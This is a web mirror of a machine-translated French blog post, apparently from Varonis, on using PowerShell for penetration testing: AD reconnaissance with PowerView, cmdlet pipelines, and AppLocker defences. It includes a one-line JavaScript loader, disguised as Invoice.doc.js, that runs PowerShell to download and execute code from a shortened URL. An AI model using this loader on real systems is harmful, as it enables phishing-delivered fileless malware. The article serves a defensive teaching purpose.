<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üçû ü§® ü•î PowerShell comme outil Pentest: scripts et exemples Varonis üè™ ‚õπüèæ üõ£Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Les pirates aiment utiliser PowerShell pour ex√©cuter des ¬´logiciels malveillants sans fichier¬ª, des logiciels malveillants incorporels qui ne sont pas...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PowerShell comme outil Pentest: scripts et exemples Varonis</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/471420/"><img src="https://habrastorage.org/webt/yz/rz/dv/yzrzdvxroj9qy1wcx-68ukv3leq.png"><br><br>  Les pirates aiment utiliser PowerShell pour ex√©cuter des ¬´logiciels malveillants sans fichier¬ª, des logiciels malveillants incorporels qui ne sont pas des binaires traditionnels avec du code malveillant compil√©, et pour cette raison, ils ne peuvent parfois pas √™tre d√©tect√©s par les solutions antivirus. <br><br>  Bien entendu, PowerShell a toujours eu un objectif tout √† fait normal, qui au d√©part n'avait rien √† voir avec les tests de p√©n√©tration.  Ceux d'entre vous qui veulent conna√Ætre le contexte de PowerShell devraient lire le c√©l√®bre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">manifeste Monad</a> .  √âcrit par l'un des d√©veloppeurs d'origine, ce manifeste explique pourquoi Microsoft avait besoin d'un nouveau langage de script (en d'autres termes, des scripts), qui s'est finalement transform√© en PowerShell. <br><a name="habracut"></a><br>  Pour vous √©viter d'avoir √† consulter un long document de 17 pages, je vais vous r√©v√©ler le principal facteur de motivation qui a incit√© les auteurs de PowerShell: il √©tait cens√© permettre aux administrateurs syst√®me d'acc√©der aux objets .Net √† partir de la ligne de commande, permettant ainsi l'automatisation du flux de travail au niveau du syst√®me, plut√¥t que au niveau de la programmation approfondie en C # ou C ++. <br><br>  Si vous voulez des preuves r√©elles de l'efficacit√© de PowerShell (ci-apr√®s d√©nomm√© PS), demandez √† vos administrateurs syst√®me comment ils ajoutent massivement des utilisateurs √† Active Directory ou effectuent des param√®tres de s√©curit√© rapides.  Vous en apprendrez tr√®s probablement sur les <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">solutions PowerShell</a> .  En bref: PS est un excellent moyen de r√©duire les routines et d'augmenter la productivit√© des administrateurs. <br><br><h2>  <font color="#D21927">Pourquoi utiliser PowerShell pour les pentests?</font> </h2><br>  Malheureusement, ce qui est si bien adapt√© en tant qu'outil d'automatisation puissant pour les administrateurs est finalement utile pour les pirates et les testeurs de p√©n√©tration. <br><br>  Supposons qu'un administrateur informatique ait √©t√© charg√© de d√©terminer qui utilise r√©ellement un serveur sous-charg√©.  √Ä l'aide de PowerShell et de la biblioth√®que de fonctions avanc√©es <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PowerView</a> , l'administrateur syst√®me peut afficher rapidement les utilisateurs connect√©s au serveur <i>, sans avoir besoin d'</i> √™tre connect√© √† ce serveur lui-m√™me: <br><br><img src="https://habrastorage.org/webt/vd/uj/4j/vduj4jfbtmqjuu1ewwqyxdqyiw4.png"><br><br>  Cependant, les cybercriminels qui avaient pr√©c√©demment obtenu un acc√®s via une attaque de phishing peuvent √©galement faire de m√™me, comme  ils peuvent utiliser les m√™mes fonctionnalit√©s dans un domaine Active Directory (ci-apr√®s d√©nomm√© AD).  Et leurs activit√©s ne seront pas n√©cessairement d√©tect√©es: un analyste de la s√©curit√© de l'information qui surveille l'utilisation des applications peut conclure que, puisqu'il <i>ne s'agit que de PowerShell, il doit √™tre inoffensif</i> . <br><br>  Pour aggraver encore plus cet exemple, les pirates peuvent m√™me obtenir toutes les informations d√©taill√©es sur les utilisateurs individuels √† l'aide de la commande Get-NetUser, qui videra tous les attributs utilisateur dans AD: <br><br><img src="https://habrastorage.org/webt/0k/xe/pf/0kxepfiywrasehvmphwsez5we9e.png"><br><br>  Malheureusement, les entreprises n√©gligent parfois les attributs AD qu'elles rendent publics pour tous les employ√©s - par exemple, domicile ou t√©l√©phone portable, adresse, etc.  Avant PowerShell, il √©tait beaucoup plus difficile de collecter toutes ces donn√©es depuis AD, mais ce n'est pas le cas! <br><br>  Que peuvent faire les attaquants avec ces informations?  Ils peuvent facilement profiter des m√©thodes d' <i>ing√©nierie sociale</i> et d√©velopper une attaque pour cela: peut-√™tre en envoyant <br>  Un e-mail avec suffisamment de contexte personnel d√©riv√© des attributs AD pour ressembler √† une demande d'assistance l√©gitime vous demandant de ¬´r√©initialiser votre mot de passe¬ª. <br><br>  Soit dit en passant, vous pouvez √©galement appliquer le contr√¥le ACL aux attributs AD, il existe donc un (!) Moyen de r√©duire le risque d'attaques de ce type.  Et c'est l'un de ces r√©sultats positifs que vous pouvez obtenir de votre propre exp√©rience de test de p√©n√©tration. <br><br><img src="https://habrastorage.org/webt/j3/pw/qy/j3pwqywf-zkdv4k043qheddjmne.png"><br><br><h2>  <font color="#D21927">Tutoriel PowerShell Pentester</font> </h2><br>  √Ä l'aide de PowerShell, les attaquants peuvent collecter discr√®tement des donn√©es utilisateur internes, puis les utiliser dans leurs attaques.  Mais il n'y a aucune raison pour que le personnel informatique ou de s√©curit√© de l'information ne puisse pas √©galement apprendre suffisamment PowerShell pour d√©marrer ses propres tests et apprendre √† comprendre l'√©tat d'esprit et les motivations du pirate. <br><br>  La premi√®re chose int√©ressante √† propos de PowerShell est que tous les anciens scripts et fichiers bat que vous avez ex√©cut√©s √† partir de la ligne de commande cmd.exe fonctionnent toujours dans la console PowerShell.  D√©j√† pas mal, non? <br><br>  Le prochain point important est que, contrairement aux shells de type Linux, PowerShell traite tout comme <i>un objet</i> .  M√™me la sortie d'une commande (pensez seulement) est √©galement un objet. <br><br>  Par exemple, entrez la commande <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Get-ChildItem</a> (ou l'applet de commande d'une mani√®re diff√©rente, car les commandes sont appel√©es dans le monde PS) dans la console, et vous verrez une liste de fichiers dans le r√©pertoire actuel: <br><br><img src="https://habrastorage.org/webt/wd/0g/vp/wd0gvpktcvbl8m3ol0qqzms9xx4.png"><br><br><h3>  <font color="#D21927">Encodage PowerShell</font> </h3><br>  Supposons que vous vouliez √©crire un script PS dans lequel seuls les fichiers de <i>plus de 10 Mo</i> sont affich√©s - par exemple, pour v√©rifier rapidement quels fichiers occupent beaucoup d'espace.  Cette t√¢che sera beaucoup plus difficile √† r√©soudre dans la sortie de cha√Æne, disons, du shell bash.  Cependant, dans PowerShell, la sortie de toute commande est elle-m√™me un objet avec un ensemble d' <i>attributs</i> . <br><br>  Pour voir cela, passez simplement la sortie GetChildItem √† <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Get-Member</a> , qui vous indiquera les attributs de l'applet de commande PS: <br><br><img src="https://habrastorage.org/webt/ax/2s/4b/ax2s4bab8oyaibmvzitbhdsayiq.png"><br><br>  Ainsi, nous avons maintenant des identifiants pour deux attributs qui nous int√©ressent: la longueur ¬´longueur¬ª et le nom ¬´nom¬ª, auxquels nous pouvons nous r√©f√©rer par programmation.  5 minutes - vol normal. <br><br>  Pour faire face √† la situation fr√©quente o√π les objets sont parfois dans des tableaux ou des collections, nous utiliserons l' <i>op√©rateur</i> PS <i>ForEach</i> pour parcourir le tableau. <br><br>  Pour rendre les choses encore plus faciles, un alias ou un alias "%" signifie "ForEach" et "$ _" repr√©sente l'objet actuel. <br><br><h3>  <font color="#D21927">Ex√©cution de commandes √† l'aide de PowerShell</font> </h3><br>  Tirons nos deux colonnes de sortie de la commande GetChildItem en fonction de nos nouvelles connaissances.  L'exemple ci-dessous est un pipeline avec Get-ChildItem qui alimente l'instruction ForEach, qui affiche uniquement les valeurs des attributs ¬´longueur¬ª et ¬´nom¬ª: <br><br><pre><code class="plaintext hljs">get-childitem | % {write-host $_.length $_.name -separator "`t`t"}</code> </pre> <br>  Et voici le r√©sultat de l'ex√©cution des commandes: <br><br><img src="https://habrastorage.org/webt/ic/fp/ag/icfpag8gul8ihfk--_tkqgdkzpk.png"><br><br>  Pour terminer notre magnifique exemple, ajustons notre script pour ne produire que des fichiers volumineux, disons, plus de 10 Mo.  Pour ce faire, nous utilisons un filtre appel√© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">applet de commande Where-Object</a> avec l'alias pratique "?". Il poss√®de tous les op√©rateurs de comparaison habituels (-gt, -eq, -lt, etc.). Nous l'ins√©rons au milieu du pipeline et du n√¥tre le script ressemble maintenant √† ceci: <br><br><pre> <code class="plaintext hljs"> get-ChildItem | ? {$_.length ‚Äìgt 10000000 | % {write-host$_.length $_.name -separator "`t`t"}</code> </pre> <br>  En tant qu'exercice, essayez d'ex√©cuter la cr√©ation PS ci-dessus dans votre propre environnement. <br><br><h2>  <font color="#D21927">Tutoriel: Exemple de test de p√©n√©tration PowerShell</font> </h2><br>  Avec cette petite exp√©rience avec PowerShell, nous sommes pr√™ts √† prendre un exemple pentest tr√®s r√©el.  L'un des moyens les plus rapides d'entrer dans un pentest est d'utiliser PowerShell pour masquer la charge utile.  Nous avons √©crit sur la fa√ßon <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">de le faire ici</a> . <br><br>  L'id√©e est de cacher notre code PowerShell dans un document Office standard avec le suffixe .doc.  En fait, le fichier aura l'extension .js, et lorsqu'il est cliqu√©, il active le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">lancement d'un script Windows</a> pour ex√©cuter JavaScript, qui lancera ensuite le code PowerShell int√©gr√©. <br><br>  Un peu d√©routant, non?  Mais les vrais pirates utilisent non pas un, mais plusieurs niveaux d'imbrication et d'obscurcissement afin de cacher et de confondre leur attaque autant que possible. <br><br><h3>  <font color="#D21927">Bootloader et pr√©paration de la charge utile</font> </h3><br>  Voici √† quoi ressemble le script: <br><br><pre> <code class="plaintext hljs">a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')",1,true);</code> </pre> <br>  Vous collez le code ci-dessus dans un fichier texte et le renommez quelque chose comme <i>Invoice.doc.js</i> .  Le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">code</a> JavaScript ci-dessus agit comme un chargeur qui s'ex√©cute √† l'aide des applets de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">commande</a> PowerShell <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">NetWebClient</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Invoke-Expression</a> int√©gr√©es, qui sont elles-m√™mes des alias avec "%". <br><br>  La m√©thode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">DownloadString</a> de la cmdlet NetWebClient extrait √† distance la charge utile r√©elle, qui fait finalement tout le sale boulot pour nous. <br><br>  Vous pouvez ins√©rer votre propre URL pointant vers votre propre programme de test.  Eh bien, l'applet de commande Invoke-Expression accepte le code de notre fichier malveillant, puis l'ex√©cute. <br><br><h3>  <font color="#D21927">D√©couvrez-le!</font> </h3><br>  Dans mon cas, l'URL pointe vers un projet Github contenant une simple commande PS Write-Host qui affichera un message inoffensif mais important pour toute l'humanit√©.  Dans une v√©ritable attaque, un fichier d'un tel sc√©nario pourrait bien √™tre joint √† une liste de diffusion de phishing, ce qui attirerait un employ√© sans m√©fiance dans un pi√®ge de curiosit√©.  Et la charge utile sera beaucoup plus destructrice. <br><br><img src="https://habrastorage.org/webt/xu/xl/9w/xuxl9wgbtv0tmkyxmzuq1paqvyu.png"><br><br>  Vous pouvez essayer ceci sur votre propre installation.  Et si tout ce qui pr√©c√®de fonctionne avec succ√®s, alors vous avez une t√¢che urgente et importante de plus, qui doit √™tre effectu√©e sans √©chec. <br><br><h2>  <font color="#D21927">Avantages des tests de p√©n√©tration</font> </h2><br><img src="https://habrastorage.org/webt/up/uh/os/upuhostqscl7nnjnwnwlmhp2d1u.png"><br><br>  Cela nous am√®ne aux raisons pour lesquelles nous faisons des tests de p√©n√©tration.  Voici trois avantages r√©els qui viennent √† l'esprit en premier: <br><br><ol><li>  En explorant les √©quipes PowerShell en tant que pentester, vous comprendrez comment les pirates informatiques ¬´piratent¬ª ce merveilleux langage de script de nouvelle g√©n√©ration.  Consid√©rez simplement la combinaison des m√©thodes DownloadString et Invoke-Expression, permettant aux attaquants d'extraire du code malveillant √† distance sur le site de la victime <i>sans</i> avoir besoin de l'enregistrer entre les deux. </li><li>  Cet exercice met √©galement l'accent sur le secret d'un pirate informatique moderne.  J'ai montr√© dans l'exemple ci-dessus un sch√©ma d'attaque qui ne laisse aucun fichier autour.  Par cons√©quent, vous ne pouvez pas utiliser des m√©thodes standard bas√©es sur les signatures pour d√©tecter de mani√®re fiable une attaque effectu√©e √† l'aide de PowerShell.  Trite, nous n'avons pas la signature du malware lui-m√™me pour comparaison. </li><li>  Vous allez probablement commencer √† explorer des moyens de <i>restreindre</i> PowerShell et d'autres m√©thodes bas√©es sur des scripts.  En fin de compte, l'attaque commence par un script, donc si les entreprises rendent difficile l'ex√©cution de scripts, elles peuvent r√©duire consid√©rablement leur profil de risque. </li></ol><br>  Permettez-moi de d√©velopper le dernier point.  Vous ne voudrez probablement pas interdire compl√®tement PowerShell (ou JavaScript), car il s'agit d'une partie fondamentale du logiciel syst√®me Windows.  Heureusement, Microsoft a un moyen de d√©sactiver s√©lectivement les scripts (et autres ex√©cutables) via <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">AppLocker</a> , une version am√©lior√©e des anciennes strat√©gies de restriction logicielle dans les strat√©gies de groupe (GPO) modernes. <br><br>  Cela peut sembler incroyable aux techniciens, mais la plupart des utilisateurs ordinaires n'ont pas besoin de PowerShell ou d'autres langages de script pour faire leur travail quotidien.  Bien s√ªr, c'est choquant, je sais!  AppLocker, par exemple, peut √™tre configur√© pour d√©sactiver l'acc√®s PowerShell pour les masses, tout en permettant aux administrateurs syst√®me de continuer √† travailler dur. <br><br>  Les attaques bas√©es sur des scripts, y compris celles li√©es aux pi√®ces jointes aux e-mails, d√©pendent des administrateurs pour fournir aux employ√©s des autorisations de script trop larges.  Et cela ne devrait pas en √™tre ainsi! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr471420/">https://habr.com/ru/post/fr471420/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr471404/index.html">Est-il possible de gagner plus en travaillant comme ing√©nieur dans un autre pays?</a></li>
<li><a href="../fr471408/index.html">Une alternative aux onduleurs √† phase vibrante: les lignes de transmission (TQWT, ALT)</a></li>
<li><a href="../fr471412/index.html">Un article sur un tas d'ordure sur le bureau</a></li>
<li><a href="../fr471414/index.html">Syst√®me de Help Desk leader. Comment obtenir les exigences et d√©velopper un service cloud?</a></li>
<li><a href="../fr471418/index.html">Que peut apprendre le march√© de la r√©alit√© virtuelle √† un concepteur de jeux?</a></li>
<li><a href="../fr471424/index.html">L'histoire de Nitro, un service de traduction professionnel qui aide les d√©veloppeurs avec la localisation et le support multilingue</a></li>
<li><a href="../fr471426/index.html">Comment l'informatique peut grandement aider la ferme collective "The Way of Communism" ou une exploitation agricole</a></li>
<li><a href="../fr471430/index.html">Comment n√©gocier avec un critique interne</a></li>
<li><a href="../fr471432/index.html">Le vilain casque Aftershokz, ou comment Marvel inspire et ce qui inspire</a></li>
<li><a href="../fr471434/index.html">Se connecter automatiquement √† une conf√©rence Lync sur Linux</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>